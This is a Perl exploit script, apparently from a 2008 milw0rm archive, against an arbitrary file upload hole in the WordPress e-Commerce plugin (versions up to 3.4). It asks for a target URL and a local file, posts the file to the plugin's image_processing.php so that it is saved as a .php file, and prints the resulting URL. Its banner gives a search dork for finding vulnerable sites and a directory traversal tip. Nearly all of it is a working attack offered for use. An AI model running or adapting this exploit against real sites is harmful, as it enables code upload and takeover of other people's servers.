#!/usr/bin/perl

use warnings;
use strict;
use LWP::UserAgent;
use HTTP::Request::Common;

my $fname = rand(99999) . ".php"; # no int()

print <<INTRO; # messy print i know..
- Wordpress Plugin e-Commerce <= 3.4 Arbitrary File Upload -
            Discovered && Coded by: t0pP8uZz
            Discovered on: 20 October 2008
  
  Theres no current vulnerabilitys for this plugin, but the
  vulnerability explained here no longer exists in the later
  versions of the plugin, due to a code rewrite.
  
  In testing this vulnerability, i wrote a scraping content
  program, and found ALOT of vulnerable sites.
  
  This exploit will upload a selected file to the...
  ... /wp-content/plugins/wp-shopping-cart/ directory.
  
  If the directory is not writable (rare cases) you can
  mod this exploit and use the insecure GET variable
  "imagedir" to directory traversal.. so you can upload
  in diffrent directorys.
  
  Contact: irc.rizon.net #sectalk
  
  Dork: inurl:"/wp-content/plugins/wp-shopping-cart/"

INTRO

print "\nEnter URL(ie: http://site.com/mambo): ";
    chomp(my $url=<STDIN>);
    
print "\nEnter File Path(path to local file to upload): ";
    chomp(my $file=<STDIN>);
    
my $ua = LWP::UserAgent->new;
my $re = $ua->request(POST $url . '/wp-content/plugins/wp-shopping-cart/image_processing.php',
                      Content_Type => 'form-data',
                      Content      => [ Submit => "Add", image => [ $file, $fname, Content_Type => 'plain/text' ], ] );

die "Exploit Failed: HTTP POST Failed!" unless $re->is_success;

if($re->content =~ /Fatal error/i) { 
    print "Complete! To see if exploit was successfull visit the following URL for your uploaded file.\n";
    print "Uploaded File: " . $url . "/wp-content/plugins/wp-shopping-cart/" . $fname . "\n";
} else
{
    print "Exploit Failed! Target host not vulnerable!\n";
}
exit;

# milw0rm.com [2008-10-29]
